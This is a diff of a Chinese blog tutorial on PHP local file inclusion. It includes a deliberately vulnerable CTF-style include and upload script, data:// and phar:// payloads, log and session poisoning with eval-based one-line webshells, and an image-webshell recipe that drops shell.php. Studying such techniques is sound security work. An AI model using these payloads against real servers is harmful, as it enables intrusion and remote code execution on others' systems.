class="hljs-keyword">__FILE__</span>).<span class="hljs-string">"\\<span class="hljs-subst">{$target_path}</span> succesfully uploaded!&lt;/pre&gt;"</span>;<br>        }<br>    }<br>    <span class="hljs-keyword">else</span> {<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;pre&gt;you can upload jpg,png,zip....&lt;/pre&gt;'</span>;<br>    }<br>}<br> <span class="hljs-meta">?&gt;</span><br>     <br><span class="hljs-comment">//传参的时候利用上面的poc，此时会成功绕过，并且执行phpinfo.txt文件里的代码（被当做php代码执行）</span><br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">//index.php
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;a href="?file=upload"&gt;upload?&lt;/a&gt;'</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"input"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"filter"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">)</span><span class="token comment">/*||stristr($file,"phar")*/</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+	<span class="token keyword">echo</span> <span class="token string double-quoted-string">"hick?"</span><span class="token punctuation">;</span>
+	<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+	<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">.</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter important">?&gt;</span></span>
+<span class="token comment">&lt;!-- flag在当前目录的某个文件中 --&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">//upload.php
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>upload.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span> <span class="token punctuation">&gt;</span></span>
+	 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>fupload<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>
+ 	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>upload!<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
+you can upload jpg,png,zip....<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/&gt;</span></span>
+<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fupload'</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token variable">$uploaded_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'fupload'</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'name'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>         <span class="token comment">//文件名</span>
+    <span class="token variable">$uploaded_ext</span>  <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_name</span><span class="token punctuation">,</span> <span class="token function">strrpos</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span> <span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//文件后缀</span>
+    <span class="token variable">$uploaded_size</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'fupload'</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'size'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>         <span class="token comment">//文件大小</span>
+    <span class="token variable">$uploaded_tmp</span>  <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'fupload'</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'tmp_name'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token comment">// 存储在服务器的文件的临时副本的名称</span>
+    <span class="token variable">$target_path</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"uploads\\"</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"."</span><span class="token operator">.</span><span class="token variable">$uploaded_ext</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span> <span class="token function">strtolower</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_ext</span> <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"jpg"</span> <span class="token operator">||</span> <span class="token class-name">strtolower</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_ext</span> <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"jpeg"</span> <span class="token operator">||</span> <span class="token class-name">strtolower</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_ext</span> <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"png"</span> <span class="token operator">||</span> <span class="token class-name">strtolower</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_ext</span> <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"zip"</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
+        <span class="token punctuation">(</span> <span class="token variable">$uploaded_size</span> <span class="token operator">&lt;</span> <span class="token number">100000</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_tmp</span><span class="token punctuation">,</span> <span class="token variable">$target_path</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">// No</span>
+            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;pre&gt;upload error&lt;/pre&gt;'</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token comment">// Yes!</span>
+            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre&gt;"</span><span class="token operator">.</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"\\<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$target_path</span><span class="token punctuation">}</span></span> succesfully uploaded!&lt;/pre&gt;"</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">else</span> <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;pre&gt;you can upload jpg,png,zip....&lt;/pre&gt;'</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+ <span class="token delimiter important">?&gt;</span></span>
+     
+//传参的时候利用上面的poc，此时会成功绕过，并且执行phpinfo.txt文件里的代码（被当做php代码执行）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h3 id="2-4-data-与phar">2.4 data://与phar://</h3>
 <p><strong>data:// 同样类似与php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。从而导致任意代码执行。(这是一个输入流执行的协议，它可以向服务器输入数据，而服务器也会执行。)</strong></p>
 <p>利用条件:</p>
@@ -572,10 +622,24 @@ file=compress.zlib://flag.php
 <li>allow_url_fopen = On</li>
 <li>allow_url_include = On</li>
 </ol>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">poc:若纯文字没用可用[base64编码]<br>data://[&lt;MIME-type&gt;][;charset=&lt;encoding&gt;][;base64],&lt;data&gt;<br>?file=data://,&lt;?php phpinfo();?&gt;<br>?file=data://text/plain,&lt;?php phpinfo();?&gt;<br>?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+<br>?file=data:text/plain,&lt;?php phpinfo();?&gt;<br>?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">poc:若纯文字没用可用[base64编码]
+data://[&lt;MIME-type&gt;][;charset=&lt;encoding&gt;][;base64],&lt;data&gt;
+?file=data://,&lt;?php phpinfo();?&gt;
+?file=data://text/plain,&lt;?php phpinfo();?&gt;
+?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
+?file=data:text/plain,&lt;?php phpinfo();?&gt;
+?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><strong>phar:// 有点类似zip://同样可以导致 任意代码执行。</strong></p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">phar://中相对路径和绝对路径都可以使用<br>利用条件：<br>php版本大于等于php5.3.0<br></code></pre></td></tr></tbody></table></figure>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">poc:<br>假设有个文件phpinfo.txt，其内容为&lt;?php phpinfo(); ?&gt;，打包成zip压缩包，如下：<br>指定绝对路径<br>index.php?file=phar://D:/phpStudy/WWW/fileinclude/test.zip/phpinfo.txt<br><br>或者使用相对路径（这里test.zip就在当前目录下）<br>index.php?file=phar://test.zip/phpinfo.txt<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">phar://中相对路径和绝对路径都可以使用
+利用条件：
+php版本大于等于php5.3.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">poc:
+假设有个文件phpinfo.txt，其内容为&lt;?php phpinfo(); ?&gt;，打包成zip压缩包，如下：
+指定绝对路径
+index.php?file=phar://D:/phpStudy/WWW/fileinclude/test.zip/phpinfo.txt
+
+或者使用相对路径（这里test.zip就在当前目录下）
+index.php?file=phar://test.zip/phpinfo.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h3 id="2-5-expect-伪协议">2.5 expect://伪协议</h3>
 <p>expect://伪协议用来执行系统命令，但是需要安装拓展<br>
 用法: <code>?file=expect://ls</code></p>
@@ -597,17 +661,20 @@ file=compress.zlib://flag.php
 <p>中间件开启了访问日志记录功能，会访问日志写入到日志文件中。<br>
 假设访问URL：<a target="_blank" rel="noopener" href="http://192.168.1.2/xxx/index.php">http://192.168.1.2/xxx/index.php</a><br>
 发现会在日志文件中有如下内容：</p>
-<figure class="highlight csharp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs csharp">[<span class="hljs-meta">root@aaa</span>]<span class="hljs-meta">#less /var/log/httpd/access_log</span><br><span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.200</span> - - [<span class="hljs-number">09</span>/Aug/<span class="hljs-number">2021</span>:<span class="hljs-number">19</span>:<span class="hljs-number">31</span>:<span class="hljs-number">20</span> +<span class="hljs-number">0800</span>] <span class="hljs-string">"GET /xxx/index.php HTTP/1.1"</span> <span class="hljs-number">200</span> <span class="hljs-number">86.</span>...<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp"><span class="token punctuation">[</span>root@aaa<span class="token punctuation">]</span>#less <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>log<span class="token operator">/</span>httpd<span class="token operator">/</span>access_log
+<span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.200</span> <span class="token operator">-</span> <span class="token operator">-</span> <span class="token punctuation">[</span><span class="token number">09</span><span class="token operator">/</span>Aug<span class="token operator">/</span><span class="token number">2021</span><span class="token punctuation">:</span><span class="token number">19</span><span class="token punctuation">:</span><span class="token number">31</span><span class="token punctuation">:</span><span class="token number">20</span> <span class="token operator">+</span><span class="token number">0800</span><span class="token punctuation">]</span> <span class="token string">"GET /xxx/index.php HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">86</span><span class="token range operator">..</span><span class="token range operator">..</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p>中间件日志访问会记录访问者的IP地址、访问时间、访问路径、返回状态码等等。<br>
 利用中间件访问记录路径到日志文件中的功能，将恶意代码写入到日志文件当中去：<br>
 添加恶意代码：<code>http://www.abc.com/xxx/&lt;?php @eval($_POST[123]);?&gt;</code><br>
 此时会提示404，但是不急<br>
 查看日志文件，发现已经将内容写入</p>
-<figure class="highlight perl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl">[root@aaa]<span class="hljs-comment">#less /var/log/httpd/access_log</span><br><span class="hljs-number">192.168</span>.<span class="hljs-number">1.200</span> - - [09/Aug/<span class="hljs-number">2021</span>:<span class="hljs-number">19</span>:<span class="hljs-number">35</span>:<span class="hljs-number">23</span> +080<span class="hljs-number">0</span>] <span class="hljs-string">"GET /xxx/%3C?php @eval($_POST[123]);?%3E HTTP/1.1"</span> <span class="hljs-number">404</span> <span class="hljs-number">826</span>....<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-perl" data-language="perl"><code class="language-perl"><span class="token punctuation">[</span>root<span class="token variable">@aaa</span><span class="token punctuation">]</span><span class="token comment">#less /var/log/httpd/access_log</span>
+<span class="token v-string string">192.168.1.200</span> <span class="token operator">-</span> <span class="token operator">-</span> <span class="token punctuation">[</span><span class="token number">09</span><span class="token operator">/</span>Aug<span class="token regex">/2021:19:35:23 +0800] "GET /xx</span><span class="token operator">x</span><span class="token operator">/</span><span class="token variable">%3</span>C<span class="token operator">?</span>php <span class="token variable">@eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">123</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span><span class="token variable">%3</span>E HTTP<span class="token operator">/</span><span class="token number">1.1</span>" <span class="token number">404</span> <span class="token number">826</span><span class="token operator">...</span><span class="token operator">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p>虽然已经写入到日志文件中去了，但是浏览器进行了URL编码，导致传入的代码不能正常使用<br>
 <strong>可以通过burpsuite抓包的方式写入恶意代码，这样不会被浏览器进行URL编码</strong><br>
 查看日志文件，内容如下</p>
-<figure class="highlight php-template"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">[root@aaa]#less /var/log/httpd/access_log</span><br><span class="language-xml">192.168.1.200 - - [09/Aug/2021:19:37:33 +0800] "GET /xxx/</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">123</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml"> HTTP/1.1" 404 302....</span><br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-php-template" data-language="php-template"><code class="language-php-template">[root@aaa]#less /var/log/httpd/access_log
+192.168.1.200 - - [09/Aug/2021:19:37:33 +0800] "GET /xxx/&lt;?php @eval($_POST[123]);?&gt; HTTP/1.1" 404 302....<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p>恶意代码成功写入</p>
 <p><strong>2. 文件包含日志文件</strong></p>
 <p>要执行文件包含，必须要知道日志文件的位置。<br>
@@ -617,7 +684,14 @@ file=compress.zlib://flag.php
 即可显示出phpinfo的内容</p>
 <h3 id="3-1-包含Apache日志文件">3.1 包含Apache日志文件</h3>
 <p><strong>WEB服务器一般会将用户的访问记录保存在访问日志中。那么我们可以根据日志记录的内容，精心构造请求，把PHP代码插入到日志文件中，通过文件包含漏洞来执行日志中的PHP代码。</strong></p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">利用条件：<br>对日志文件可读<br>知道日志文件的存储目录<br><br>注意：<br>一般情况下日至存储目录会被修改，需要读取服务器配置文件(httpd.conf,nginx.conf....)或者根据phpinfo()中的信息来得知<br><br>日志记录的信息都可以被调整，比如记录报错的等级，或者内容格式<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">利用条件：
+对日志文件可读
+知道日志文件的存储目录
+
+注意：
+一般情况下日至存储目录会被修改，需要读取服务器配置文件(httpd.conf,nginx.conf....)或者根据phpinfo()中的信息来得知
+
+日志记录的信息都可以被调整，比如记录报错的等级，或者内容格式<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><strong>Apache运行后一般默认会生成两个日志文件，Windos下是access.log（访问日志）和error.log(错误日志)，Linux下是access_log和error_log，访问日志文件记录了客户端的每次请求和服务器响应的相关信息。<br>
   如果访问一个不存在的资源时，如<a target="_blank" rel="noopener" href="http://www.xxxx.com/">http://www.xxxx.com/</a><!--?php phpinfo(); ?-->,则会记录在日志中，但是代码中的敏感字符会被浏览器转码，我们可以通过burpsuit绕过编码，就可以把<!--?php phpinfo(); ?--> 写入apache的日志文件，然后可以通过包含日志文件来执行此代码，但前提是你得知道apache日志文件的存储路径，所以为了安全起见，安装apache时尽量不要使用默认路径。</strong></p>
 <p>参考文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/my1e3/p/5854897.html">1.包含日志文件getshell</a><br>
@@ -655,14 +729,31 @@ file=compress.zlib://flag.php
 <p>参考： <a target="_blank" rel="noopener" href="https://highon.coffee/blog/lfi-cheat-sheet/#procselffd-lfi-method">LFI Cheat Sheet：/proc/self/environ LFI Method</a></p>
 <h3 id="3-5-包含SESSION">3.5 包含SESSION</h3>
 <p><strong>可以先根据尝试包含到SESSION文件，在根据文件内容寻找可控变量，在构造payload插入到文件中，最后包含即可。</strong></p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">利用条件：<br>找到Session内的可控变量<br>Session文件可读写，并且知道存储路径<br><br>一般通过以下两种方式获取session的存储位置：<br><br>通过phpinfo的信息获取session的存储位置。<br>通过phpinfo的信息获取session.save_path<br>通过猜测默认的session存储位置进行尝试<br>通常Linux中的Session的默认存储位置在/var/lib/php/session目录下<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">利用条件：
+找到Session内的可控变量
+Session文件可读写，并且知道存储路径
+
+一般通过以下两种方式获取session的存储位置：
+
+通过phpinfo的信息获取session的存储位置。
+通过phpinfo的信息获取session.save_path
+通过猜测默认的session存储位置进行尝试
+通常Linux中的Session的默认存储位置在/var/lib/php/session目录下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><strong>php的session文件的保存路径可以在phpinfo的session.save_path看到。</strong></p>
-<p><img src="image-20230321200640758.png" alt="image-20230321200640758"></p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">session常见存储路径：<br><br>/var/lib/php/sess_PHPSESSID<br>/var/lib/php/sess_PHPSESSID<br>/tmp/sess_PHPSESSID<br>/tmp/sessions/sess_PHPSESSID<br>session文件格式： sess_[phpsessid] ，而 phpsessid 在发送的请求的 cookie 字段中可以看到。<br></code></pre></td></tr></tbody></table></figure>
+<p><img src="/2023/08/07/qian-xi-wen-jian-bao-han/image-20230321200640758.png" alt="image-20230321200640758"></p>
+<pre class="line-numbers language-none"><code class="language-none">session常见存储路径：
+
+/var/lib/php/sess_PHPSESSID
+/var/lib/php/sess_PHPSESSID
+/tmp/sess_PHPSESSID
+/tmp/sessions/sess_PHPSESSID
+session文件格式： sess_[phpsessid] ，而 phpsessid 在发送的请求的 cookie 字段中可以看到。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>参考文章：<a target="_blank" rel="noopener" href="https://chybeta.github.io/2017/11/09/%E4%B8%80%E9%81%93CTF%E9%A2%98%EF%BC%9APHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">一道SESSION包含的CTF题</a></p>
 <p><strong>示例分析：</strong></p>
 <p>session文件包含代码如下</p>
-<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$ctfs</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'ctfs'</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'username'</span>]=<span class="hljs-variable">$ctfs</span><br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$ctfs</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctfs'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$ctfs</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>此代码可以通过GET型的ctfs参数传入。PHP代码将会获取的值存入到Session中。<br>
 攻击者可以利用ctfs参数将恶意代码写入到session文件中，然后在利用文件包含漏洞包含此session文件，向系统中传递恶意代码。</p>
 <p><strong>漏洞分析</strong></p>
@@ -690,7 +781,7 @@ session文件的内容为：<code>username|s:18:"&lt;?php phpinfo();?&gt;"</code
 </ul>
 <p>比如：<code>http://www.abc.com/xxx/file.php?file=../../var/lib/php/session/sess_7sdfysdfywy9323cew2</code></p>
 <h3 id="3-6-包含临时文件">3.6 包含临时文件</h3>
-<p><img src="image-20230321200926394.png" alt="image-20230321200926394"></p>
+<p><img src="/2023/08/07/qian-xi-wen-jian-bao-han/image-20230321200926394.png" alt="image-20230321200926394"></p>
 <p><strong>php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用c:\winsdows\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。</strong></p>
 <p><strong>由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有65535中不同的文件名，所以这个方法是可行的。</strong></p>
 <p><strong>另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。这个方法可以参考[LFI With PHPInfo Assistance](<a target="_blank" rel="noopener" href="https://www.insomniasec.com/downloads/publications/LFI">https://www.insomniasec.com/downloads/publications/LFI</a> With PHPInfo Assistance.pdf)</strong></p>
@@ -698,68 +789,173 @@ session文件的内容为：<code>username|s:18:"&lt;?php phpinfo();?&gt;"</code
 <h3 id="3-7-包含上传文件">3.7 包含上传文件</h3>
 <p><strong>很多网站通常会提供文件上传功能，比如：上传头像、文档等，这时就可以采取上传一句话图片木马的方式进行包含。</strong></p>
 <p><strong>图片马的制作方式如下，在cmd控制台下输入：</strong></p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">进入1.jph和2.php的文件目录后，执行：<br><br>copy  1.jpg/b+2.php  3.jpg<br><br>将图片1.jpg和包含php代码的2.php文件合并生成图片马3.jpg<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">进入1.jph和2.php的文件目录后，执行：
+
+copy  1.jpg/b+2.php  3.jpg
+
+将图片1.jpg和包含php代码的2.php文件合并生成图片马3.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><strong>假设已经上传一句话图片木马到服务器，路径为<code>/upload/201811.jpg</code></strong><br>
 <strong>图片代码如下：</strong></p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;?fputs(fopen("shell.php","w"),"&lt;?php eval($_POST['pass']);?&gt;")?&gt;<br></code></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?fputs(fopen("shell.php","w"),"&lt;?php eval($_POST['pass']);?&gt;")?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><strong>然后访问URL：<code>http://www.xxxx.com/index.php?page=./upload/201811.jpg</code>，包含这张图片，将会在<code>index.php</code>所在的目录下生成<code>shell.php</code></strong></p>
 <h3 id="3-8-其他包含姿势">3.8 其他包含姿势</h3>
